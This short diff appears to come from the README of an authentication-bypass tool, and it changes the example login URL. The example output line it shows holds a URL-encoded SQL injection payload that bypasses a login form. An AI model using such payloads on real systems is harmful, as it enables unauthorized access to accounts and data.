@@ -28,7 +28,7 @@ Response Handling: Checks if the response contains a specific pattern (Dashboard
 
 Example Output
 Copy code
-Enter URL: http://example.com/login
+Enter URL: http://example.com/login.php
 [+] Authentication bypassed using the following payload: username=%27+or+%271%27%3D%271%27%23&password=asdasd&login=
 
 
